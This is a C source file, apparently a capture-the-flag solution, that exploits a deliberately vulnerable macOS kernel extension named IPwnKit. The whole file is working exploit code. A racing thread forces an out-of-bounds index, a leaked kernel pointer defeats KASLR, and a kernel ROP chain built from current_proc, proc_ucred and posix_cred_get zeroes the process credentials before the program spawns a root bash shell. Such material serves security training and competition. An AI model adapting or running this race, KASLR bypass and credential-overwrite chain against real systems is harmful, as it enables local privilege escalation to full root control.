#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <unistd.h>

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#define ipwnkit_open        0
#define ipwnkit_close       1
#define ipwnkit_sayhi       2
#define ipwnkit_readnum     3
#define ipwnkit_writenum    4
#define ipwnkit_fillarray   5

io_connect_t connection;
uint64_t oobidx = 0;
uint64_t kernel_base = 0xffffff8006e00000;
pthread_t race_thread;

struct Args {
    uint64_t index;
    uint64_t value;
    char padding[0x1000];
} args;

void *racer_function(void *thread_args) {
    while (true) {
        args.index = oobidx;
        pthread_testcancel();
    }
}

void IPwnKitConnect() {
    CFDictionaryRef matchingDict = NULL;
    mach_port_t master_port = 0;
    io_iterator_t iter = 0;
    io_service_t service = 0;
    kern_return_t kr;

    kr = host_get_io_master(mach_host_self(), &master_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] Error in host_get_io_master\n");
        exit(-1);
    }

    matchingDict = IOServiceMatching("io_oooverflow_IPwnKit");

    kr = IOServiceGetMatchingServices(master_port, matchingDict, &iter);

    service = IOIteratorNext(iter);
    IOObjectRelease(iter);
    if (!service) {
        printf("[-] Service Error\n");
        exit(-1);
    }

    kr = IOServiceOpen(service, mach_task_self(), 0, &connection);
    IOObjectRelease(service);
    if (kr != KERN_SUCCESS) {
        printf("[-] Error in IOServiceOpen\n");
        exit(-1);
    }

    kr = IOConnectCallScalarMethod(connection, ipwnkit_open, NULL, 0, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("[-] Error in IPwnKit Open\n");
        exit(-1);
    }
}

uint64_t readNum(uint64_t idx) {
    kern_return_t kr;
    uint64_t out[2] = {0, };
    uint32_t outSize = 2;
    args.index = idx;
    kr = IOConnectCallMethod(connection, ipwnkit_readnum, 0, 0, &args, sizeof(args), out, &outSize, 0, 0);
    if (kr != KERN_SUCCESS) {
        //printf("[-] Read Fail\n");
        //exit(-1);
    }
    return out[1];
}

uint64_t writeNum(uint64_t idx, uint64_t value) {
    kern_return_t kr;
    uint64_t out[2] = {0, };
    uint32_t outSize = 2;
    args.index = idx;
    args.value = value;
    kr = IOConnectCallMethod(connection, ipwnkit_writenum, 0, 0, &args, sizeof(args), out, &outSize, 0, 0);
    if (kr != KERN_SUCCESS) {
        //printf("[-] Write Fail\n");
        //exit(-1);
    }
    return out[0];
}

void FillArray(void *payload, uint64_t size) {
    kern_return_t kr;
    char buf[0x4000] = {0, };
    uint64_t out;
    uint32_t outSize = 1;
    uint64_t res = 0;
    memset(buf, 'A', 0x4000);
    memcpy(buf, payload, size);

    args.index = 0;
    args.value = 0x11223344;

    // for test
    for(int i = 0; i < 10; i++)
        writeNum(i, (uint64_t)0xdadadadafafafafa);

    oobidx = -1;
    pthread_create(&race_thread, NULL, racer_function, (void *)0);

    // out[0] is index
    // So, if we write array[-1], out[0] will be 0xffffffffffffffff
    while (!res) {
        // overwrite length property
        res = writeNum(0, (uint64_t)size << 29);
    }

    printf("[-] res : %p\n", (void *)res);

    pthread_cancel(race_thread);
    pthread_join(race_thread, NULL);

    printf("[-] Trigger Stack Corruption\n");
    // scalar input, size, struct input, size, output, outputsize, struct output, output size
    kr = IOConnectCallMethod(connection, ipwnkit_fillarray, 0, 0, buf, sizeof(buf), &out, &outSize, 0, 0);
}

uint64_t OOBRead() {
    uint64_t result;
    pthread_t racer;
    result = readNum(0);
    pthread_create(&race_thread, NULL, racer_function, (void *)0);
    while (!result) {
        result = readNum(0);
    }

    pthread_cancel(race_thread);
    pthread_join(race_thread, NULL);

    return result;
}

uint64_t get_kext() {
    FILE *fp = popen("kextstat | grep overflow | awk '{print $3}'", "r");
    char buf[0x30] = {0, };
    char *ptr;
    fgets(buf, 0x20, fp);
    return strtoul(buf, &ptr, 16);
}

int main(int argc, char *argv[]) {
    uint64_t leak = 0;
    uint64_t kext = 0;
    uint64_t kslide = 0;
    uint64_t payload[29] = {0, };
    IPwnKitConnect();
    oobidx = -30;
    leak = OOBRead();
    kext = get_kext();
    kslide = leak - 0x2070 - kext;

    printf("[-] leak : %p\n", (void *)leak);
    printf("[-] kext : %p\n", (void *)kext);
    printf("[-] kslide : %p\n", (void *)kslide);

    printf("[-] Getting Root Shell\n");

    // rbp - 0x70
    for(int i = 0; i < 14; i++) {
        payload[i] = 0xddaaddaaddaaddaa;
    }
    payload[14] = 0xdadadadafafafafa;
    payload[15] = kslide + 0xffffff8000810670;  // current_proc()
    payload[16] = kslide + 0xffffff800023c172;  // pop rcx; ret;
    payload[17] = kslide + 0xffffff800023c172;  // pop rcx; ret;        <- set rcx
    payload[18] = kslide + 0xffffff8000831276;  // mov rdi, rax; pop rbp; jmp rcx;
    payload[19] = 0x1337133813391340;  // for "pop rbp"
    payload[20] = kslide + 0xffffff800023c172;  // for "pop rcx"
    payload[21] = kslide + 0xffffff8000720c40;  // proc_ucred()
    payload[22] = kslide + 0xffffff8000831276;  // mov rdi, rax; pop rbp; jmp rcx;
    payload[23] = 0xdafadafadafadafa;   // for "pop rbp"
    payload[24] = 0xdeadbeefdeadbeef;   // for "pop rcx"
    payload[25] = kslide + 0xffffff80006ec4c0;  // posix_cred_get()
    //payload[26] = kslide + 0xffffff80008c5acd;  // mov qword ptr [rax + 8], 0; pop rbp; ret
    payload[26] = kslide + 0xffffff80005f3979;  // mov qword ptr [rax], 0; pop rbp; ret
    payload[27] = 0x4141414142424242;
    payload[28] = kslide + 0xffffff800021f21a;  // thread_exception_return()
    FillArray((void *)payload, sizeof(payload));

    setuid(0);
    if (getuid() != 0) {
        printf("[-] Fail to get root privilege\n");
        exit(-1);
    }

    printf("[-] Enjoy\n");
    system("/bin/bash");
    return 0;
}
